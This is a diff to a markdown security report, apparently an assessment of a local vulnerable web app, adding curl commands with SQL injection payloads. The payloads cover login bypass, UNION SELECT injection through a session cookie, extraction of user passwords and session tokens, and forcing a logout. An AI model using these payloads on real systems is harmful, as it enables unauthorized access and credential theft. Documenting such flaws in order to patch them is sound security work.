@@ -31,7 +31,7 @@ List of vulnerabilities discovered:
 > ```bash
 > curl 'http://0.0.0.0:5000/login' -X POST --data-raw "username=a' OR 1=1 --&password="
 > curl 'http://0.0.0.0:5000/login' -X POST --data-raw "username=a' OR TRUE --&password="
-> curl 'http://0.0.0.0:5000/login' -X POST --data-raw "username=' UNION select 1 from users; --&password="
+> curl 'http://0.0.0.0:5000/login' -X POST --data-raw "username=' UNION SELECT id FROM users; --&password="
 > ```
 
 > [!IMPORTANT]
@@ -52,6 +52,7 @@ List of vulnerabilities discovered:
 > curl -L 'http://0.0.0.0:5000/home' -H "Cookie: session_token=' UNION SELECT id, username FROM users LIMIT 1 --" 
 > curl 'http://0.0.0.0:5000/posts' -X POST -H "Cookie: session_token=' UNION SELECT id, username FROM users LIMIT 1--" --data-raw "message=message=1', 1), ((SELECT GROUP_CONCAT(id || ',' || username || ':' || password, '<br>') FROM users), 1)--"
 > curl 'http://0.0.0.0:5000/posts' -X POST -H "Cookie: session_token=' UNION SELECT id, username FROM users LIMIT 1--" --data-raw "message=1', 1), ((SELECT GROUP_CONCAT(user || ':' || token, '<br>') FROM sessions), 1)--"
+> curl -L 'http://0.0.0.0:5000/logout'  -H "Cookie: session_token=' UNION SELECT 1 AS id, 'maldev' AS username FROM users --"
 > ```
 
 ### CSRF
@@ -549,6 +550,15 @@ the output is
 ```
 
 ***This is a serious concern...***
+
+It is also possible to force a user to logout of their session (equivalent to deleting the session tokens in the database)
+
+```bash
+curl -L 'http://0.0.0.0:5000/logout' -H "Cookie: session_token=' UNION SELECT 1 AS id, 'maldev' AS username FROM users--"
+```
+
+This vulnerability might give a hint to CSRF (Cross-Site Request Forgery) attack.
+
 
 
 ## Patching the vulnerabilities
